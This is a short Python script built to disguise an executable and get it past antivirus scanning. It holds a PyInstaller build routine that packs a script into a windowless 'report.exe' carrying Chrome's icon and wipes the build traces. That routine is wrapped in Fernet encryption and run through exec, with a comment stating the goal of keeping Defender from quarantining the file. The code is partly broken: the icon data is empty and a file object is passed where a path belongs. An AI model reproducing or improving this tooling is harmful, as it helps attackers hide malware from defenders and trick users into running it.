from cryptography.fernet import Fernet

"""
The code is encrypted so AVs like Defender(we create .exe file, so our main concern is Defender does not
delete it or put it in quarantine for us. Also the code clean useless mess that is generated by Pyinstaller.__main__..
It also embeds the icon in base64(I chose Chrome icon) that will be used for .exe file icon 
"""
code = b"""

import PyInstaller.__main__
import shutil
import os
import base64

# base64 encoded icon string
encoded_icon = ""

# Decode and save as an ICO file
home_dir = os.path.expanduser("~")
downloads_path = os.path.join(home_dir, "Downloads", "chrome.ico")



with open(downloads_path, 'wb') as icon_file:
    icon_file.write(base64.b64decode(encoded_icon))

exename = 'report.exe'
pwd = os.getcwd()

# Generate the executable file using PyInstaller
try:
    PyInstaller.__main__.run([
        'helloworld.py',
        '--clean',
        '--log-level=ERROR',
        '--onefile',
        '--noconsole',
        '--icon=' + icon_file,
        '--name=report'
    ])

    # Move the executable to the current directory and rename it
    dist_path = os.path.join(pwd, 'dist', 'report.exe')
    if os.path.exists(dist_path):
        shutil.move(dist_path, os.path.join(pwd, exename))
    else:
        raise FileNotFoundError(f"{dist_path} not found. Check if PyInstaller ran successfully.")

    # Clean up auto-generated files and directories
    #print("Removing build directory")
    shutil.rmtree(os.path.join(pwd, 'build'), ignore_errors=True)
    #print("Removing dist directory")
    shutil.rmtree(os.path.join(pwd, 'dist'), ignore_errors=True)
    #print("Removing spec file")
    spec_file = os.path.join(pwd, 'report.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)


except Exception as e:
    print(f"An error occurred: {e}")
"""

key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)
exec(decrypted_message)
